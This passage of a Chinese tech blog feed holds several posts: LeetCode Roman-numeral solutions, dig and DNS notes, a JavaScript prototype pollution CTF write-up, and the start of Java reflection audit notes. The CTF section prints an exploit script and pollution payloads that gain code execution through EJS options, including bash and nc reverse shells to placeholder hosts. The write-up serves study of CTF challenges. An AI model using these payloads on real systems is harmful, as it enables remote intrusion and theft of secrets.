"/img/loading.gif" data-src="/posts/becfc22d/1580397968376.png" alt></p><p>php5.5.9 也可以</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580397984801.png" alt></p><p>如果换成 php 7.3.4 nts 、5.3.29、5.4.45、5.6.9则报错</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580397995259.png" alt></p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>php在5.6.6中将长度比较的安全检查逻辑给去掉了</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580398009005.png" alt></p><p>原来有安全检查的代码是这样子的：</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580398026408.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache </tag>
            
            <tag> RCE </tag>
            
            <tag> SSI </tag>
            
            <tag> 截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-数组题</title>
      <link href="/posts/734660ee/"/>
      <url>/posts/734660ee/</url>
      
        <content type="html"><![CDATA[<h2 id="整数转罗马数字"><a href="#整数转罗马数字" class="headerlink" title="整数转罗马数字"></a>整数转罗马数字</h2><p>题目虽然不难，但是也整了好久，后来才明白转成罗马数字就是不断地做除法和模</p><p>但是我这里遇到了一个问题，python中的字典本来是无序的，所以我就拆成了两个list来存放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intToRoman</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        nums = [<span class="number">1000</span>,<span class="number">900</span>,<span class="number">500</span>,<span class="number">400</span>,<span class="number">100</span>,<span class="number">90</span>,<span class="number">50</span>,<span class="number">40</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>]</span><br><span class="line">        chars = [<span class="string">'M'</span>,<span class="string">'CM'</span>,<span class="string">'D'</span>,<span class="string">'CD'</span>,<span class="string">'C'</span>,<span class="string">'XC'</span>,<span class="string">'L'</span>,<span class="string">'XL'</span>,<span class="string">'X'</span>,<span class="string">'IX'</span>,<span class="string">'V'</span>,<span class="string">'IV'</span>,<span class="string">'I'</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            x = num // i</span><br><span class="line">            num = num % i</span><br><span class="line">            result += x*chars[nums.index(i)]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这样当然是没问题得，但是我看到评论区居然有人用python的字典也成功了</p><p>这就很疑惑了，于是我修改了代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intToRoman</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = <span class="string">""</span></span><br><span class="line">        roman = &#123;<span class="number">1000</span>:<span class="string">'M'</span>,<span class="number">900</span>:<span class="string">'CM'</span>, <span class="number">500</span>:<span class="string">'D'</span>, <span class="number">400</span>:<span class="string">'CD'</span>, <span class="number">100</span>:<span class="string">'C'</span>,<span class="number">90</span>:<span class="string">'XC'</span>, <span class="number">50</span>:<span class="string">'L'</span>, <span class="number">40</span>: <span class="string">'XL'</span>,<span class="number">10</span>:<span class="string">'X'</span>,<span class="number">9</span>:<span class="string">'IX'</span>, <span class="number">5</span>:<span class="string">'V'</span>,<span class="number">4</span>:<span class="string">'IV'</span>, <span class="number">1</span>:<span class="string">'I'</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> roman:</span><br><span class="line">            x = num // i</span><br><span class="line">            num = num % i</span><br><span class="line">            result += x*roman[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>居然也过了！！！</p><p>难道leetcode的python解释器不一样？</p><p><img src= "/img/loading.gif" data-src="/posts/734660ee/1580397588462.png" alt></p><h2 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h2><p>这个题目就更妙了，秒就妙在对于哈希表的处理上</p><p>如果是我想的话，只需要将上个题的哈希表倒过来就行了，但是实际上我们可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">'I'</span>:<span class="number">1</span>, <span class="string">'IV'</span>:<span class="number">3</span>, <span class="string">'V'</span>:<span class="number">5</span>, <span class="string">'IX'</span>:<span class="number">8</span>, <span class="string">'X'</span>:<span class="number">10</span>, <span class="string">'XL'</span>:<span class="number">30</span>, <span class="string">'L'</span>:<span class="number">50</span>, <span class="string">'XC'</span>:<span class="number">80</span>, <span class="string">'C'</span>:<span class="number">100</span>, <span class="string">'CD'</span>:<span class="number">300</span>, <span class="string">'D'</span>:<span class="number">500</span>, <span class="string">'CM'</span>:<span class="number">800</span>, <span class="string">'M'</span>:<span class="number">1000</span>&#125;</span><br></pre></td></tr></table></figure><p>本来 <code>IV</code> 是代表4的，但是在这里却减去了1，其余的9，40，90都是类似的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span><span class="params">(self, s: str)</span> -&gt; int:</span></span><br><span class="line">        d = &#123;<span class="string">'I'</span>:<span class="number">1</span>, <span class="string">'IV'</span>:<span class="number">3</span>, <span class="string">'V'</span>:<span class="number">5</span>, <span class="string">'IX'</span>:<span class="number">8</span>, <span class="string">'X'</span>:<span class="number">10</span>, <span class="string">'XL'</span>:<span class="number">30</span>, <span class="string">'L'</span>:<span class="number">50</span>, <span class="string">'XC'</span>:<span class="number">80</span>, <span class="string">'C'</span>:<span class="number">100</span>, <span class="string">'CD'</span>:<span class="number">300</span>, <span class="string">'D'</span>:<span class="number">500</span>, <span class="string">'CM'</span>:<span class="number">800</span>, <span class="string">'M'</span>:<span class="number">1000</span>&#125;</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,n <span class="keyword">in</span> enumerate(s):</span><br><span class="line">            a = max(i<span class="number">-1</span>,<span class="number">0</span>)</span><br><span class="line">            b = d.get(s[a:i+<span class="number">1</span>], d[n]) <span class="comment"># 每次取两个元素，如果有就说明是4，9这类，如果没有就采取默认的 d[n]</span></span><br><span class="line">            result += b</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>不得不说这种方法确实很巧妙，甚至可以浓缩为一句话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> sum(d.get(s[max(i<span class="number">-1</span>, <span class="number">0</span>):i+<span class="number">1</span>], d[n]) <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(s))</span><br></pre></td></tr></table></figure><p>不过效率对比上来看，浓缩之后的速度反而变慢了</p><p><img src= "/img/loading.gif" data-src="/posts/734660ee/1580397813912.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-dig</title>
      <link href="/posts/f1616294/"/>
      <url>/posts/f1616294/</url>
      
        <content type="html"><![CDATA[<h2 id="基本选项："><a href="#基本选项：" class="headerlink" title="基本选项："></a>基本选项：</h2><p>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>-P：指定域名服务器所使用端口号；<br>-t&lt;类型&gt;：指定要查询的DNS数据类型；<br>-x&lt;IP地址&gt;：执行逆向域名查询；<br>-4：使用IPv4；<br>-6：使用IPv6；<br>-h：显示指令帮助信息。</p><p>比如我要用Google的DNS</p><p><code>dig prontosil.club @8.8.8.8</code></p><p>查询解析记录<br><code>dig prontosil.club -t CNAME</code></p><p>得到结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;; QUESTION SECTION:</span><br><span class="line">;prontosil.club.                        IN      CNAME</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">prontosil.club.         600     IN      CNAME   2zeqwj.coding-pages.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 55 msec</span><br></pre></td></tr></table></figure><p>查询 TXT 记录</p><p><code>dig _pages-challenge.prontosil.club -t TXT</code></p><p>得到结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;; ANSWER SECTION:</span><br><span class="line">_pages-challenge.prontosil.club. 600 IN TXT     &quot;rCAijO55WRowkOABj2JwHDEacVPpxo5rkCtDr2eG7J0&#x3D;.ItO58cZnxtPdQAIzuUTAumBPxAZ4nwBjsGfmWl&#x2F;Rhg0&#x3D;&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析记录</title>
      <link href="/posts/b69cd839/"/>
      <url>/posts/b69cd839/</url>
      
        <content type="html"><![CDATA[<h2 id="博客域名解析"><a href="#博客域名解析" class="headerlink" title="博客域名解析"></a>博客域名解析</h2><p>如下是我在腾讯云后台的设置</p><p><img src= "/img/loading.gif" data-src="/posts/b69cd839/1580398267570.png" alt></p><p>按照腾讯云的解释</p><p><img src= "/img/loading.gif" data-src="/posts/b69cd839/1580398281271.png" alt></p><p>可以查询到 <a href="http://www.prontosil.club" target="_blank" rel="noopener">www.prontosil.club</a> 的解析记录为</p><p><img src= "/img/loading.gif" data-src="/posts/b69cd839/1580398293465.png" alt></p><p>经过多次的折腾发现，<code>@</code> 解析记录只能有一个默认，只能有一个记录类型，比如我这里是A记录设置为 <code>@</code>，那么CNAME记录就不能设置为 <code>@</code></p><p>同时我终于发现<code>www</code> 和裸域的区别了，之前还一直以为是同一个</p><h2 id="裸域"><a href="#裸域" class="headerlink" title="裸域"></a>裸域</h2><p>不加 www 的裸域名好处主要是域名更加简短、容易记忆。坏处就多了，讲几个主要的技术原因：<br>裸域名只能绑定 DNS 的 A 记录，不能绑定 CNAME 记录。也就是说你不能把裸域设定为另外域名的别名。很多时候这对管理不是很方便，特别是使用第三方托管服务的时候。如果第三方迁移服务器导致 IP 地址变更，你必须自己去更改 DNS 的 A 记录。</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><p><img src= "/img/loading.gif" data-src="/posts/b69cd839/1580398319776.png" alt></p><p>这种可以用来出题</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染</title>
      <link href="/posts/5d5d07b8/"/>
      <url>/posts/5d5d07b8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.species = <span class="string">"动物"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个”猫”对象的构造函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name,color</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">　　　　<span class="keyword">this</span>.name = name;</span><br><span class="line"></span><br><span class="line">　　　　<span class="keyword">this</span>.color = color;</span><br><span class="line"></span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.prototype = <span class="keyword">new</span> Animal();</span><br><span class="line"></span><br><span class="line">Cat.prototype.constructor = Cat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> Cat(<span class="string">"大毛"</span>,<span class="string">"黄色"</span>);</span><br><span class="line"></span><br><span class="line">alert(cat1.species); <span class="comment">// 动物</span></span><br></pre></td></tr></table></figure><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src= "/img/loading.gif" data-src="/posts/5d5d07b8/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src= "/img/loading.gif" data-src="/posts/5d5d07b8/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.defaultsDeep(&#123; &#39;user&#39;: &#123; &#39;name&#39;: &#39;barney&#39; &#125; &#125;, &#123; &#39;user&#39;: &#123; &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 &#125; &#125;);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &#123; &#39;user&#39;: &#123; &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 &#125; &#125;</span><br></pre></td></tr></table></figure><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src= "/img/loading.gif" data-src="/posts/5d5d07b8/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">blueprints: <span class="built_in">Object</span>.entries(user.blueprints).map(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> (&#123;</span><br><span class="line">  id: k,</span><br><span class="line">  content: v.content,</span><br><span class="line">  public: v.public,</span><br><span class="line">&#125;)),</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://localhost/"</span></span><br><span class="line">user_id = <span class="string">"559eb9b06eb8c581b74f33c1202bff50"</span></span><br><span class="line">res = requests.post(URL+<span class="string">"make"</span>,cookies=&#123;<span class="string">"user_id"</span>:user_id&#125;,json=&#123;<span class="string">"content"</span>:<span class="string">"aaaa"</span>, <span class="string">"public"</span>:<span class="string">"true"</span>,<span class="string">"constructor"</span>:&#123;<span class="string">"prototype"</span>:&#123;<span class="string">"public"</span>:<span class="string">"true"</span>&#125;&#125;&#125;)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res2 = requests.get(URL, cookies=&#123;<span class="string">"user_id"</span>:user_id&#125;)</span><br><span class="line">print(res2.text)</span><br></pre></td></tr></table></figure><h3 id="新春战疫-ezexpress"><a href="#新春战疫-ezexpress" class="headerlink" title="新春战疫 ezexpress"></a>新春战疫 ezexpress</h3><p>用到了JavaScript的一个小trick</p><p>两个奇特的字符 ==”ı”、”ſ”。==</p><p> 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p><p>绕过之后，就可以登陆,看到一个很显然的 <code>clone</code> 操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>那么就可以污染属性了。污染哪个呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们这里就直接污染 <code>res.outputFunctionName</code> </p><p>(测试的时候Windows下无法用nc弹shell)</p><p><img src= "/img/loading.gif" data-src="/posts/5d5d07b8/1583322699980.png" alt></p><p>然后访问 info 页面即可</p><p>原来的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h3><p>这题也是JavaScript原型链污染，不过这里更明显</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">sekiro = fn(sekiro)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Function</code> 是动态构造函数</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"solution"</span>:<span class="string">"1"</span>,<span class="attr">"__proto__"</span>:&#123;<span class="attr">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process').exec('nc vps-ip port -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/5d5d07b8/1583323453485.png" alt></p><p>然后vps上即可监听到请求(当然我这里只是nc一下)</p><p>写到这里突然又想起来了 2019XNUCA的一道JavaScript原型链污染的题目</p><h3 id="2019-XNUCA-hardjs"><a href="#2019-XNUCA-hardjs" class="headerlink" title="2019 XNUCA hardjs"></a>2019 XNUCA hardjs</h3><p>(盗了一张图过来)</p><p>能够RCE的点出在 <code>res.render</code> 处，具体的就不分析了，这里是最后的变量拼接的地方</p><p><img src= "/img/loading.gif" data-src="/posts/5d5d07b8/j_3.png" alt></p><p>从这里可以看到有两个拼接的变量可以使用</p><p>于是就能够构造两个payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"wiki"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>: &#123;<span class="attr">"prototype"</span>: &#123;<span class="attr">"client"</span>: <span class="literal">true</span>,<span class="attr">"escapeFunction"</span>: <span class="string">"1; return process.env.FLAG"</span>,<span class="attr">"debug"</span>:<span class="literal">true</span>, <span class="attr">"compileDebug"</span>: <span class="literal">true</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">    <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"constructor"</span>: &#123;</span><br><span class="line">            <span class="attr">"prototype"</span>: &#123;</span><br><span class="line">            <span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;return process.env.FLAG;//;var __tmp2"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然要是想弹shell也不是不可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"constructor"</span>: &#123;</span><br><span class="line">            <span class="attr">"prototype"</span>: &#123;</span><br><span class="line">            <span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\"');var __tmp2"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在回顾起当时遇到这道题还啥都不会，现在又突然想起来的这种感觉好好玩</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></p><p><a href="http://passingfoam.com/2019/08/31/XNUCA-2019-web-复现/" target="_blank" rel="noopener">http://passingfoam.com/2019/08/31/XNUCA-2019-web-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java审计笔记</title>
      <link href="/posts/21b61fbe/"/>
      <url>/posts/21b61fbe/</url>
      
        <content type="html"><![CDATA[<h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>正常执行一条命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br></pre></td></tr></table></figure><p>如果通过反射来执行：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(null), "calc");</span><br></pre></td></tr></table></figure><p><code>Runtime</code> 的构造方法是私有的，遵循单例模式，所以无法直接调用，但是可以通过调用静态方法 <code>getRuntime</code> 来获得一个 <code>Runtime</code> 对象，这个方法是静态的，并不需要传递类的实例进去(不然就陷入了死循环)，而调用之后返回的结果是一个 <code>Runtime</code> 对象，作为 <code>exec</code> 方法的第一个参数，这是因为 <code>exec</code> 方法不是静态方法</p><p>我们正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> </p><p>当然如果分解开来比较好理解一点:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);  <span 